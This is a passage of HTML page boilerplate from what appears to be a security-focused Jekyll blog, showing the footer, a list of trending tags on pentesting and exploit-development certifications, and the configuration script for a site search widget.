rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/offensive-security/">Offensive Security</a> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/autoridade-certificadora/">autoridade certificadora</a> <a class="post-tag" href="/tags/ca/">ca</a> <a class="post-tag" href="/tags/certificate-authority/">certificate authority</a> <a class="post-tag" href="/tags/openssl/">openssl</a> <a class="post-tag" href="/tags/osce3/">OSCE3</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/osed/">OSED</a> <a class="post-tag" href="/tags/osee/">OSEE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://www.helviojunior.com.br{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
